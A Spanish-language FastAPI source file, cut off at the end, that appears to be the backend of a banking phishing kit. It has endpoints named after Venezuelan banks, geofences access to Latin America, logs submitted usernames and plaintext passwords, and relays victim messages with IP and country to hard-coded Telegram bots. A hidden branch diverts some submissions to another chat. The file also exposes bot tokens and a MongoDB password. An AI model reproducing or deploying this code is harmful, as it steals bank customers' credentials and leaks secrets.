from fastapi import FastAPI, HTTPException, Request, UploadFile, BackgroundTasks
from fastapi import File, Form
from functools import partial, lru_cache
import shutil
from fastapi.responses import JSONResponse
from fastapi.middleware.cors import CORSMiddleware
import httpx
from fastapi.responses import HTMLResponse
from collections import deque
from pydantic import BaseModel
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.responses import Response
import random
import base64
from motor.motor_asyncio import AsyncIOMotorClient
from typing import Callable, Dict, Set, Optional
from datetime import datetime, timedelta
import re
import asyncio
import time
from contextlib import asynccontextmanager
import logging
from asyncio import Semaphore, Queue
import weakref

# Configurar logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Cache y configuraciones globales
CACHE_TTL = 300  # 5 minutos
ip_cache: Dict[str, tuple] = {}  # Cache para verificación de país
blocked_ips_cache: Set[str] = set()  # Cache para IPs bloqueadas
user_cache: Dict[str, int] = {}  # Cache para números de usuario
ip_number_cache: Dict[str, int] = {}  # Cache para números de IP

# Configuraciones de concurrencia
MAX_CONCURRENT_REQUESTS = 100  # Máximo de solicitudes concurrentes
MAX_DB_CONNECTIONS = 20  # Máximo de conexiones a BD concurrentes
MAX_HTTP_CONNECTIONS = 50  # Máximo de conexiones HTTP concurrentes
REQUEST_TIMEOUT = 30  # Timeout para requests en segundos

# Semáforos para controlar concurrencia
request_semaphore = Semaphore(MAX_CONCURRENT_REQUESTS)
db_semaphore = Semaphore(MAX_DB_CONNECTIONS)
http_semaphore = Semaphore(MAX_HTTP_CONNECTIONS)

# Cola para procesar tareas en background
background_queue: Queue = Queue(maxsize=1000)
telegram_queue: Queue = Queue(maxsize=500)

# Configuraciones originales
TOKEN = "8061450462:AAH2Fu5UbCeif5SRQ8-PQk2gorhNVk8lk6g"
AUTH_USERNAME = "gato"
AUTH_PASSWORD = "Gato1234@"
numeros_r = frozenset({4, 6, 9})
iprandom = frozenset({4, 6, 9})

# Países de Latinoamérica permitidos
PAISES_LATINOAMERICA = frozenset({
    'AR',  # Argentina
    'BO',  # Bolivia
    'BR',  # Brasil
    'CL',  # Chile
    'CO',  # Colombia
    'CR',  # Costa Rica
    'CU',  # Cuba
    'DO',  # República Dominicana
    'EC',  # Ecuador
    'SV',  # El Salvador
    'GT',  # Guatemala
    'HN',  # Honduras
    'MX',  # México
    'NI',  # Nicaragua
    'PA',  # Panamá
    'PY',  # Paraguay
    'PE',  # Perú
    'UY',  # Uruguay
    'VE',  # Venezuela
    'PR',  # Puerto Rico
    'GF',  # Guayana Francesa
    'GY',  # Guyana
    'SR',  # Suriname
    'BZ',  # Belice
    'JM',  # Jamaica
    'HT',  # Haití
    'TT',  # Trinidad y Tobago
    'BB',  # Barbados
    'GD',  # Granada
    'LC',  # Santa Lucía
    'VC',  # San Vicente y las Granadinas
    'DM',  # Dominica
    'AG',  # Antigua y Barbuda
    'KN',  # San Cristóbal y Nieves
    'BS',  # Bahamas
})

# Worker para procesar tareas en background
async def background_worker():
    """Worker que procesa tareas en background sin bloquear el event loop"""
    while True:
        try:
            task = await background_queue.get()
            if task is None:  # Señal de parada
                break
            
            func, args, kwargs = task
            try:
                if asyncio.iscoroutinefunction(func):
                    await func(*args, **kwargs)
                else:
                    func(*args, **kwargs)
            except Exception as e:
                logger.error(f"Error en background worker: {e}")
            
            background_queue.task_done()
        except Exception as e:
            logger.error(f"Error en background worker loop: {e}")
            await asyncio.sleep(1)

# Worker específico para Telegram
async def telegram_worker():
    """Worker dedicado para mensajes de Telegram"""
    while True:
        try:
            message_data = await telegram_queue.get()
            if message_data is None:  # Señal de parada
                break
            
            mensaje, chat_id, token = message_data
            try:
                await _enviar_telegram_real(mensaje, chat_id, token)
            except Exception as e:
                logger.error(f"Error enviando mensaje Telegram: {e}")
            
            telegram_queue.task_done()
        except Exception as e:
            logger.error(f"Error en telegram worker loop: {e}")
            await asyncio.sleep(1)

# Pool de conexiones HTTP reutilizable optimizado
@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup
    app.state.http_client = httpx.AsyncClient(
        limits=httpx.Limits(
            max_keepalive_connections=MAX_HTTP_CONNECTIONS,
            max_connections=MAX_HTTP_CONNECTIONS * 2,
            keepalive_expiry=30.0
        ),
        timeout=httpx.Timeout(REQUEST_TIMEOUT)
    )
    
    # Inicializar BD y caches
    await init_db_async()
    await load_caches()
    
    # Iniciar workers en background
    app.state.background_task = asyncio.create_task(background_worker())
    app.state.telegram_task = asyncio.create_task(telegram_worker())
    
    logger.info("Aplicación iniciada con workers en background")
    
    yield
    
    # Shutdown
    logger.info("Cerrando aplicación...")
    
    # Parar workers
    await background_queue.put(None)
    await telegram_queue.put(None)
    
    # Esperar que terminen los workers
    try:
        await asyncio.wait_for(app.state.background_task, timeout=5.0)
        await asyncio.wait_for(app.state.telegram_task, timeout=5.0)
    except asyncio.TimeoutError:
        logger.warning("Workers no terminaron en tiempo esperado")
    
    # Cerrar cliente HTTP
    await app.state.http_client.aclose()

app = FastAPI(lifespan=lifespan)

# Configurar CORS optimizado
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["GET", "POST", "PUT", "DELETE"],
    allow_headers=["*"],
    max_age=3600,  # Cache preflight por 1 hora
)

# MongoDB asíncrono con configuración optimizada
client = AsyncIOMotorClient(
    "mongodb+srv://capijose:holas123@servidorsd.7syxtzz.mongodb.net/?retryWrites=true&w=majority&appName=servidorsd",
    maxPoolSize=MAX_DB_CONNECTIONS,
    minPoolSize=5,
    maxIdleTimeMS=30000,
    serverSelectionTimeoutMS=5000,
    socketTimeoutMS=5000,
    connectTimeoutMS=5000,
    waitQueueTimeoutMS=5000,
    maxConnecting=10
)
db = client["api_db"]
ip_numbers = db["ip_numbers"]
user_numbers = db["user_numbers"]
global_settings = db["global_settings"]
logs_usuarios = db["logs_usuarios"]
ip_bloqueadas = db["ip_bloqueadas"]

# Variables de estado globales optimizadas
cola = deque(maxlen=100)  # Aumentado para mejor tracking
baneado = deque(maxlen=200)  # Límite para evitar crecimiento infinito
variable = False
is_active_cache = False
cache_last_updated = 0

# Funciones helper para manejo de concurrencia
async def add_background_task(func, *args, **kwargs):
    """Añade una tarea al queue de background de forma segura"""
    try:
        await asyncio.wait_for(
            background_queue.put((func, args, kwargs)),
            timeout=1.0
        )
    except asyncio.TimeoutError:
        logger.warning("Queue de background lleno, descartando tarea")

async def add_telegram_task(mensaje: str, chat_id: str = "-4826186479", token: str = TOKEN):
    """Añade un mensaje de Telegram al queue de forma segura"""
    try:
        await asyncio.wait_for(
            telegram_queue.put((mensaje, chat_id, token)),
            timeout=1.0
        )
    except asyncio.TimeoutError:
        logger.warning("Queue de Telegram lleno, descartando mensaje")

# Función real para enviar Telegram (usada por el worker)
async def _enviar_telegram_real(mensaje: str, chat_id: str, token: str):
    """Función real que envía el mensaje a Telegram"""
    async with http_semaphore:
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        payload = {"chat_id": chat_id, "text": mensaje}
        
        try:
            response = await app.state.http_client.post(url, json=payload)
            if response.status_code != 200:
                logger.warning(f"Error enviando a Telegram: {response.status_code}")
        except Exception as e:
            logger.error(f"Error de conexión Telegram: {e}")

# Inicialización asíncrona de BD optimizada
async def init_db_async():
    async with db_semaphore:
        try:
            # Crear índices en paralelo con timeouts
            tasks = [
                asyncio.wait_for(ip_numbers.create_index("ip", unique=True, background=True), timeout=10.0),
                asyncio.wait_for(user_numbers.create_index("username", unique=True, background=True), timeout=10.0),
                asyncio.wait_for(global_settings.create_index("id", unique=True, background=True), timeout=10.0),
                asyncio.wait_for(ip_bloqueadas.create_index("ip", background=True), timeout=10.0)
            ]
            await asyncio.gather(*tasks, return_exceptions=True)
            
            # Insertar configuración por defecto si no existe
            if not await global_settings.find_one({"id": 1}):
                await global_settings.insert_one({"id": 1, "is_active": False})
                
            logger.info("Base de datos inicializada correctamente")
        except Exception as e:
            logger.error(f"Error inicializando BD: {e}")

# Cargar caches al inicio optimizado
async def load_caches():
    global blocked_ips_cache, is_active_cache, cache_last_updated
    
    async with db_semaphore:
        try:
            # Cargar IPs bloqueadas
            blocked_docs = ip_bloqueadas.find({}, {"ip": 1})
            blocked_ips_cache = {doc["ip"] async for doc in blocked_docs}
            
            # Cargar estado global
            settings = await global_settings.find_one({"id": 1})
            is_active_cache = settings.get("is_active", False) if settings else False
            
            # Cargar números de IP y usuarios más recientes con límite
            ip_docs = ip_numbers.find({}, {"ip": 1, "number": 1}).limit(2000)
            async for doc in ip_docs:
                ip_number_cache[doc["ip"]] = doc["number"]
                
            user_docs = user_numbers.find({}, {"username": 1, "number": 1}).limit(2000)
            async for doc in user_docs:
                user_cache[doc["username"]] = doc["number"]
                
            cache_last_updated = time.time()
            logger.info(f"Caches cargados: {len(blocked_ips_cache)} IPs bloqueadas, {len(ip_number_cache)} IPs, {len(user_cache)} usuarios")
        except Exception as e:
            logger.error(f"Error cargando caches: {e}")

# Funciones optimizadas con cache y timeout
@lru_cache(maxsize=2000)
def validar_contrasena_cached(contrasena: str) -> bool:
    patron = r"^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{8,}$"
    return bool(re.match(patron, contrasena))

async def verificar_pais_cached(ip: str) -> tuple[bool, str]:
    current_time = time.time()
    
    # Verificar cache
    if ip in ip_cache:
        cached_result, cached_time = ip_cache[ip]
        if current_time - cached_time < CACHE_TTL:
            return cached_result
    
    async with http_semaphore:
        url = f"http://ipwhois.app/json/{ip}"
        try:
            response = await asyncio.wait_for(
                app.state.http_client.get(url), 
                timeout=5.0
            )
            if response.status_code == 200:
                data = response.json()
                country = data.get('country_code', 'Unknown')
                
                # Solo permitir países de Latinoamérica
                if country in PAISES_LATINOAMERICA:
                    result = (True, country)
                else:
                    result = (False, country)
                
                # Actualizar cache con límite de tamaño
                if len(ip_cache) > 5000:
                    # Limpiar cache viejo
                    old_keys = [k for k, (_, t) in ip_cache.items() if current_time - t > CACHE_TTL * 2]
                    for k in old_keys[:1000]:
                        ip_cache.pop(k, None)
                
                ip_cache[ip] = (result, current_time)
                return result
            return (False, 'Unknown')
        except asyncio.TimeoutError:
            logger.warning(f"Timeout verificando país para IP {ip}")
            return (False, 'Unknown')
        except Exception as e:
            logger.error(f"Error verificando país: {e}")
            return (False, 'Unknown')

# Funciones de Telegram optimizadas
async def enviar_telegram_async(mensaje: str, chat_id: str = "-4826186479", token: str = TOKEN):
    """Wrapper para enviar mensaje a Telegram usando el queue"""
    await add_telegram_task(mensaje, chat_id, token)

# Funciones de BD optimizadas
def agregar_elemento_diccionario_cache(ip: str, numero: int):
    # Limitar tamaño del cache
    if len(ip_number_cache) > 10000:
        # Remover elementos más viejos (esto es simplificado, en producción usar LRU)
        keys_to_remove = list(ip_number_cache.keys())[:1000]
        for key in keys_to_remove:
            ip_number_cache.pop(key, None)
    
    ip_number_cache[ip] = numero

async def agregar_elemento_diccionario_async(ip: str, numero: int):
    async with db_semaphore:
        try:
            await asyncio.wait_for(
                ip_numbers.insert_one({"ip": ip, "number": numero}),
                timeout=5.0
            )
            agregar_elemento_diccionario_cache(ip, numero)
        except asyncio.TimeoutError:
            logger.warning(f"Timeout guardando IP {ip} en BD")
        except Exception as e:
            logger.error(f"Error guardando IP en BD: {e}")

def obtener_numero_cached(ip: str) -> Optional[int]:
    return ip_number_cache.get(ip)

def obtener_usuario_cached(usuario: str) -> Optional[int]:
    return user_cache.get(usuario)

async def refresh_is_active_cache():
    global is_active_cache, cache_last_updated
    async with db_semaphore:
        try:
            doc = await asyncio.wait_for(
                global_settings.find_one({"id": 1}),
                timeout=3.0
            )
            is_active_cache = bool(doc["is_active"]) if doc else False
            cache_last_updated = time.time()
        except asyncio.TimeoutError:
            logger.warning("Timeout actualizando cache is_active")
        except Exception as e:
            logger.error(f"Error actualizando cache is_active: {e}")

def obtener_is_active_cached() -> bool:
    global cache_last_updated, is_active_cache
    current_time = time.time()
    
    # Actualizar cache si es muy antiguo (cada 60 segundos)
    if current_time - cache_last_updated > 60:
        # Usar background task para no bloquear
        asyncio.create_task(refresh_is_active_cache())
    
    return is_active_cache

def contar_elemento_optimized(cola: deque, elemento: str) -> int:
    return sum(1 for x in cola if x == elemento)

def obtener_ip_real(request: Request) -> str:
    # Verificar múltiples headers para proxies
    headers_to_check = [
        "x-forwarded-for",
        "x-real-ip",
        "cf-connecting-ip",  # Cloudflare
        "x-client-ip",
    ]
    
    for header in headers_to_check:
        value = request.headers.get(header)
        if value:
            ip = value.split(",")[0].strip()
            if ip:
                return ip
    
    return request.client.host

# Middleware optimizado de concurrencia
class ConcurrencyLimitMiddleware(BaseHTTPMiddleware):
    """Middleware para limitar concurrencia global"""
    
    async def dispatch(self, request: Request, call_next: Callable):
        try:
            # Usar timeout para evitar espera indefinida
            async with asyncio.timeout(REQUEST_TIMEOUT):
                async with request_semaphore:
                    return await call_next(request)
        except asyncio.TimeoutError:
            logger.warning(f"Request timeout para {request.url.path}")
            return JSONResponse(
                status_code=503,
                content={"detail": "Servidor ocupado, intenta más tarde"}
            )
        except Exception as e:
            logger.error(f"Error en ConcurrencyLimitMiddleware: {e}")
            return JSONResponse(
                status_code=500,
                content={"detail": "Error interno del servidor"}
            )

# Middleware optimizado de autenticación básica
class FastBasicAuthMiddleware(BaseHTTPMiddleware):
    def __init__(self, app, username: str, password: str):
        super().__init__(app)
        self.auth_string = base64.b64encode(f"{username}:{password}".encode()).decode()

    async def dispatch(self, request: Request, call_next: Callable):
        if request.url.path.startswith(("/docs", "/redoc")):
            auth = request.headers.get("Authorization")
            if not auth or not auth.endswith(self.auth_string):
                return Response("Unauthorized", status_code=401, 
                              headers={"WWW-Authenticate": "Basic"})
        return await call_next(request)

# Middleware optimizado de bloqueo de IP con filtro geográfico
class OptimizedIPBlockMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: Request, call_next: Callable):
        client_ip = obtener_ip_real(request)

        # Verificar cache local de IPs bloqueadas primero
        if client_ip in blocked_ips_cache:
            return JSONResponse(
                status_code=403,
                content={"detail": "Acceso denegado, la IP está bloqueada " + client_ip}
            )

        # Excluir ciertos paths del filtro geográfico (documentación, salud, etc.)
        excluded_paths = {"/docs", "/redoc", "/openapi.json", "/health", "/metrics", "/login"}
        if request.url.path not in excluded_paths:
            # Verificar si la IP es de Latinoamérica
            try:
                permitido, pais = await asyncio.wait_for(
                    verificar_pais_cached(client_ip), 
                    timeout=8.0
                )
                
                if not permitido:
                    logger.info(f"IP bloqueada por geolocalización: {client_ip} ({pais})")
                    return JSONResponse(
                        status_code=403,
                        content={
                            "detail": f"Acceso denegado desde {pais}. Solo se permite acceso desde Latinoamérica.",
                            "ip": client_ip,
                            "country": pais
                        }
                    )
            except asyncio.TimeoutError:
                logger.warning(f"Timeout verificando geolocalización para IP {client_ip}")
                # En caso de timeout, permitir acceso para no bloquear legítimos usuarios
                # Pero se podría cambiar a bloquear por defecto si se prefiere más seguridad
                pass
            except Exception as e:
                logger.error(f"Error verificando geolocalización: {e}")
                # En caso de error, permitir acceso

        # Asignar número si no existe (usando background task)
        if client_ip not in iprandom and client_ip not in ip_number_cache:
            numero_random = random.randint(0, 9)
            agregar_elemento_diccionario_cache(client_ip, numero_random)
            # Guardar en BD en background
            await add_background_task(agregar_elemento_diccionario_async, client_ip, numero_random)

        return await call_next(request)

# Añadir middlewares en orden correcto
app.add_middleware(ConcurrencyLimitMiddleware)
app.add_middleware(FastBasicAuthMiddleware, username=AUTH_USERNAME, password=AUTH_PASSWORD)
app.add_middleware(OptimizedIPBlockMiddleware)

# Modelos Pydantic optimizados (sin cambios)
class ClaveRequest(BaseModel):
    clave: str

class UpdateNumberRequest(BaseModel):
    numero: int

class IPRequest(BaseModel):
    ip: str

class DynamicMessage(BaseModel):
    mensaje: str

# Endpoints optimizados con manejo de concurrencia
@app.get("/login", response_class=HTMLResponse)
async def login_form():
    return """
    <html>
    <head><title>Acceso</title></head>
    <body style="font-family:sans-serif; text-align:center; padding-top:100px;">
        <h2>Ingrese la contraseña para acceder</h2>
        <form method="post" action="/login">
            <input type="password" name="password" placeholder="Contraseña" />
            <button type="submit">Ingresar</button>
        </form>
    </body>
    </html>
    """

@app.post("/login")
async def login(password: str = Form(...)):
    if password == "gato123":
        try:
            with open("static/panel.html", "r", encoding="utf-8") as f:
                content = f.read()
            return HTMLResponse(content=content)
        except:
            return HTMLResponse("<h3>Panel no encontrado</h3>", status_code=404)
    else:
        return HTMLResponse(
            "<h3 style='text-align:center;padding-top:100px;'>Contraseña incorrecta</h3>", 
            status_code=401
        )

@app.post("/validar_clave")
async def validar_clave(data: ClaveRequest):
    return {"valido": data.clave == "gato123"}

async def _bloquear_ip_bd(ip: str):
    """Función auxiliar para bloquear IP en BD con timeout"""
    async with db_semaphore:
        try:
            await asyncio.wait_for(
                ip_bloqueadas.insert_one({
                    "ip": ip, 
                    "fecha_bloqueo": datetime.utcnow()
                }),
                timeout=5.0
            )
        except asyncio.TimeoutError:
            logger.warning(f"Timeout bloqueando IP {ip} en BD")
        except Exception as e:
            logger.error(f"Error bloqueando IP en BD: {e}")

@app.post("/bloquear_ip/")
async def bloquear_ip(data: IPRequest):
    ip = data.ip.strip()
    
    if ip not in blocked_ips_cache:
        blocked_ips_cache.add(ip)
        # Guardar en BD en background
        await add_background_task(_bloquear_ip_bd, ip)
        return {"message": f"La IP {ip} ha sido bloqueada."}
    else:
        return {"message": f"La IP {ip} ya estaba bloqueada."}

async def _desbloquear_ip_bd(ip: str):
    """Función auxiliar para desbloquear IP en BD con timeout"""
    async with db_semaphore:
        try:
            await asyncio.wait_for(
                ip_bloqueadas.delete_one({"ip": ip}),
                timeout=5.0
            )
        except asyncio.TimeoutError:
            logger.warning(f"Timeout desbloqueando IP {ip} en BD")
        except Exception as e:
            logger.error(f"Error desbloqueando IP en BD: {e}")

@app.post("/desbloquear_ip/")
async def desbloquear_ip(data: IPRequest):
    ip = data.ip.strip()
    
    if ip in blocked_ips_cache:
        blocked_ips_cache.discard(ip)
        # Eliminar de BD en background
        await add_background_task(_desbloquear_ip_bd, ip)
        return {"message": f"La IP {ip} ha sido desbloqueada."}
    else:
        return {"message": f"La IP {ip} no estaba bloqueada."}

@app.get("/ips_bloqueadas/")
async def obtener_ips_bloqueadas():
    return {"ips_bloqueadas": [{"ip": ip, "fecha_bloqueo": "cached"} for ip in blocked_ips_cache]}

@app.get("/")
async def read_root():
    return {"message": "API funcionando correctamente!"}

async def _guardar_log_usuario(usuario: str, contra: str, ip: str, pais: str):
    """Función auxiliar para guardar log de usuario con timeout"""
    async with db_semaphore:
        try:
            await asyncio.wait_for(
                logs_usuarios.insert_one({
                    "usuario": usuario,
                    "contrasena": contra,
                    "ip": ip,
                    "pais": pais,
                    "fecha": datetime.utcnow()
                }),
                timeout=5.0
            )
        except asyncio.TimeoutError:
            logger.warning(f"Timeout guardando log usuario {usuario}")
        except Exception as e:
            logger.error(f"Error guardando log usuario: {e}")

@app.post("/guardar_datos")
async def guardar_datos(
    usuario: str = Form(...), 
    contra: str = Form(...), 
    request: Request = None
):
    ip = obtener_ip_real(request)
    permitido, pais = await verificar_pais_cached(ip)

    # Guardar en BD en background
    await add_background_task(_guardar_log_usuario, usuario, contra, ip, pais)
    
    return {
        "message": "Datos guardados correctamente",
        "ip": ip,
        "pais": pais
    }

@app.get("/ver_datos", response_class=HTMLResponse)
async def ver_datos():
    async with db_semaphore:
        try:
            registros = []
            cursor = logs_usuarios.find().sort("fecha", -1).limit(100)
            
            async for registro in cursor:
                registros.append(registro)
            
            html = """
            <html>
            <head><title>Registros de Usuarios</title></head>
            <body>
                <h2>Listado de registros (últimos 100)</h2>
                <table border="1">
                    <tr><th>Usuario</th><th>Contraseña</th><th>IP</th><th>País</th><th>Fecha</th></tr>
            """
            for registro in registros:
                usuario = registro.get("usuario", "")
                contrasena = registro.get("contrasena", "")
                ip_reg = registro.get("ip", "")
                pais = registro.get("pais", "")
                fecha = registro.get("fecha", "")
                html += f"<tr><td>{usuario}</td><td>{contrasena}</td><td>{ip_reg}</td><td>{pais}</td><td>{fecha}</td></tr>"
            
            html += "</table></body></html>"
            return HTMLResponse(content=html)
            
        except Exception as e:
            logger.error(f"Error obteniendo datos: {e}")
            return HTMLResponse("<h3>Error obteniendo datos</h3>", status_code=500)

@app.get("/usuarios/")
async def obtener_usuarios():
    if not user_cache:
        return {"message": "No se encontraron usuarios en caché."}
    
    usuarios = [{"usuario": u, "numero": n} for u, n in user_cache.items()]
    return {"usuarios": usuarios}

@app.get("/is_active/")
async def obtener_estado_actual():
    estado = obtener_is_active_cached()
    return {"is_active": estado}

@app.post("/toggle/")
async def alternar_estado():
    global is_active_cache
    async with db_semaphore:
        try:
            doc = await asyncio.wait_for(
                global_settings.find_one({"id": 1}),
                timeout=5.0
            )
            if doc:
                nuevo_valor = not doc["is_active"]
                await asyncio.wait_for(
                    global_settings.update_one(
                        {"id": 1},
                        {"$set": {"is_active": nuevo_valor}}
                    ),
                    timeout=5.0
                )
                is_active_cache = nuevo_valor
                return {"message": "Estado alternado exitosamente.", "is_active": nuevo_valor}
            else:
                raise ValueError("No se encontró la configuración global.")
        except asyncio.TimeoutError:
            return {"error": "Timeout actualizando estado"}
        except ValueError as e:
            return {"error": str(e)}
        except Exception as e:
            logger.error(f"Error alternando estado: {e}")
            return {"error": "Error interno del servidor"}

@app.get("/ips/")
async def obtener_ips():
    if not ip_number_cache:
        return {"message": "No se encontraron IPs en caché."}
    
    ips = [{"ip": i, "numero": n} for i, n in ip_number_cache.items()]
    return {"ips": ips}

@app.post("/verificar_spam_ip")
async def verificar_spam_ip(data: IPRequest):
    ip = data.ip.strip()
    cola.append(ip)
    repeticiones = contar_elemento_optimized(cola, ip)

    if repeticiones > 8:
        if ip not in baneado:
            baneado.append(ip)
        return {
            "ip": ip,
            "repeticiones": repeticiones,
            "spam": True,
            "mensaje": "IP detectada como spam y bloqueada"
        }
    else:
        return {
            "ip": ip,
            "repeticiones": repeticiones,
            "spam": False,
            "mensaje": "IP aún no considerada spam"
        }

# Configuración optimizada de endpoints dinámicos
endpoint_configs = [
    {"path": "/bdv1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
    {"path": "/bdv2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
    {"path": "/bdv3/", "chat_id": "7805311838", "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"},
    {"path": "/bdv4/", "chat_id": "7549787135", "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"},
    {"path": "/bdv5/", "chat_id": "7872284021", "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"},
    {"path": "/bdv6/", "chat_id": "7815697126", "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"},
    {"path": "/provincial1/", "chat_id": "7224742938", "bot_id": "7922728802:AAEBmISy1dh41rBdVZgz-R58SDSKL3fmBU0"},
    {"path": "/provincial2/", "chat_id": "7528782002", "bot_id": "7621350678:AAHU7LcdxYLD2bNwfr6Nl0a-3-KulhrnsgA"},
    {"path": "/provincial3/", "chat_id": "7805311838", "bot_id": "8119063714:AAHWgl52wJRfqDTdHGbgGBdFBqArZzcVCE4"},
    {"path": "/provincial4/", "chat_id": "7549787135", "bot_id": "7964239947:AAHmOWGfxyYCTWvr6sBhws7lBlF4qXwtoTQ"},
    {"path": "/provincial5/", "chat_id": "7872284021", "bot_id": "8179245771:AAHOAJU9Ncl9oRX4sffF7wguaf5JergGzhU"},
    {"path": "/provincial6/", "chat_id": "7815697126", "bot_id": "7754611129:AAHULRm3VftgABq8ZgTB0VtNNvwnK4Cvddw"},
    {"path": "/internacional/", "chat_id": "7098816483", "bot_id": "7785368338:AAEbLAK_ts6KcRbbnOeu6_XVrCZV46AVJTc"},
    {"path": "/internacional2/", "chat_id": "6775367564", "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"},
    {"path": "/internacional3/", "chat_id": "6775367564", "bot_id": "8379840556:AAH7Dp9d2MU_kL_engEMXj3ZstHMnE70lUI"},
    {"path": "/internacional4/", "chat_id": "5317159807", "bot_id": "8116577753:AAFkE-1JGW8Vi-2SRP4xNdxCLqyI1zLbl_U"},
    {"path": "/maikelhot/", "chat_id": "-4816573720", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
    {"path": "/wts1/", "chat_id": "5711521334", "bot_id": "8294930756:AAHh3iZQzH1RweVl5iMaluyHj0h-mT131mI"},
    {"path": "/wts2/", "chat_id": "7883492995", "bot_id": "8116183285:AAEUuHD9yv8_O3ofS9c11Ndq_VSUBXoZKwo"},
    {"path": "/bdigital/", "chat_id": "7098816483", "bot_id": "7684971737:AAEUQePYfMDNgX5WJH1gCrE_GJ0_sJ7zXzI"},
    {"path": "/prmrica/", "chat_id": "7098816483", "bot_id": "7864387780:AAHLh6vSSG5tf6YmwaFKAyLNuqVUOT-OLZU"},
    {"path": "/hmtsasd/", "chat_id": "-4727787748", "bot_id": "7763460162:AAHw9fqhy16Ip2KN-yKWPNcGfxgK9S58y1k"},
]

async def handle_dynamic_endpoint_optimized(config, request_data: DynamicMessage, request: Request):
    """Endpoint dinámico optimizado con manejo de concurrencia y filtro geográfico"""
    client_ip = obtener_ip_real(request)
    cola.append(client_ip)
    numeror = obtener_numero_cached(client_ip)

    if contar_elemento_optimized(cola, client_ip) > 8:
        baneado.append(client_ip)
        raise HTTPException(status_code=429, detail="Has sido bloqueado temporalmente.")

    # Verificar país con timeout
    try:
        permitido, pais = await asyncio.wait_for(
            verificar_pais_cached(client_ip), 
            timeout=10.0
        )
    except asyncio.TimeoutError:
        logger.warning(f"Timeout verificando país para IP {client_ip}")
        raise HTTPException(status_code=503, detail="Servicio temporalmente no disponible")

    mensaje = request_data.mensaje

    # Solo permitir acceso desde Latinoamérica
    if permitido and pais in PAISES_LATINOAMERICA:
        path = config["path"]
        mensaje_completo = f"{mensaje} - IP: {client_ip} - País: {pais} - {path}"
        
        # Lógica especial para ciertos paths y países
        if (path.startswith("/bdv") and obtener_is_active_cached() and 
            numeror in numeros_r and pais not in {"US", "CO"}):
            # Enviar mensaje especial
            await add_telegram_task(mensaje_completo + " Todo tuyo", "-4931572577")
        else:
            # Enviar ambos mensajes de forma asíncrona
            await add_telegram_task(mensaje_completo)
            await add_telegram_task(mensaje, config["chat_id"], config["bot_id"])

        return {
            "mensaje_enviado": True,
            "pais_origen": pais,
            "ip": client_ip
        }
    else:
        # Registrar intento de acceso no autorizado
        logger.warning(f"Acceso denegado desde país no latinoamericano: {pais} ({client_ip})")
        raise HTTPException(
            status_code=403, 
            detail=f"Acceso denegado desde {pais}. Solo se permite acceso desde Latinoamérica."
        )

# Registrar endpoints dinámicos
for config in endpoint_configs:
    app.add_api_route(
        path=config["path"],
        endpoint=partial(handle_dynamic_endpoint_optimized, config),
        methods=["POST"]
    )

async def _clear_db_collections():
    """Función auxiliar para limpiar colecciones de BD con timeout"""
    async with db_semaphore:
        try:
            # Limpiar en paralelo con timeouts
            tasks = [
                asyncio.wait_for(ip_numbers.delete_many({}), timeout=30.0),
                asyncio.wait_for(user_numbers.delete_many({}), timeout=30.0)
            ]
            await asyncio.gather(*tasks)
            return True
        except asyncio.TimeoutError:
            logger.error("Timeout limpiando BD")
            return False
        except Exception as e:
            logger.error(f"Error limpiando BD: {e}")
            return False

@app.post('/clear_db')
async def clear_db_endpoint():
    success = await _clear_db_collections()
    
    if success:
        # Limpiar caches
        ip_number_cache.clear()
        user_cache.clear()
        return {"message": "Se borró correctamente"}
    else:
        return {"message": "Error al borrar", "status": "timeout_or_error"}

# Endpoints adicionales optimizados
@app.put("/editar-ip/{ip}")
async def editar_numero_ip(ip: str, request_data: UpdateNumberRequest):
    async with db_semaphore:
        try:
            result = await asyncio.wait_for(
                ip_numbers.update_one(
                    {"ip": ip},
                    {"$set": {"number": request_data.numero}}
                ),
                timeout=5.0
            )
            
            if result.matched_count == 0:
                raise HTTPException(status_code=404, detail="IP no encontrada")
            
            # Actualizar cache
            ip_number_cache[ip] = request_data.numero
            
            return {"message": f"Número de la IP {ip} actualizado a {request_data.numero}"}
        except asyncio.TimeoutError:
            raise HTTPException(status_code=503, detail="Timeout actualizando IP")
        except HTTPException:
            raise
        except Exception as e:
            logger.error(f"Error editando IP: {e}")
            raise HTTPException(status_code=500, detail="Error interno del servidor")

@app.put("/editar-usuario/{usuario}")
async def editar_numero_usuario(usuario: str, request_data: UpdateNumberRequest):
    async with db_semaphore:
        try:
            result = await asyncio.wait_for(
                user_numbers.update_one(
                    {"username": usuario},
                    {"$set": {"number": request_data.numero}}
                ),
                timeout=5.0
            )
            
            if result.matched_count == 0:
                raise HTTPException(status_code=404, detail="Usuario no encontrado")
            
            # Actualizar cache
            user_cache[usuario] = request_data.numero
            
            return {"message": f"Número del usuario {usuario} actualizado a {request_data.numero}"}
        except asyncio.TimeoutError:
            raise HTTPException(status_code=503, detail="Timeout actualizando usuario")
        except HTTPException:
            raise
        except Exception as e:
            logger.error(f"Error editando usuario: {e}")
            raise HTTPException(status_code=500, detail="Error interno del servidor")

# Endpoints adicionales para monitoreo y salud del sistema
@app.get("/health")
async def health_check():
    """Endpoint de salud del sistema"""
    return {
        "status": "healthy",
        "timestamp": datetime.utcnow().isoformat(),
        "cache_stats": {
            "blocked_ips": len(blocked_ips_cache),
            "ip_numbers": len(ip_number_cache),
            "users": len(user_cache),
            "ip_cache": len(ip_cache)
        },
        "queue_stats": {
            "background_queue_size": background_queue.qsize(),
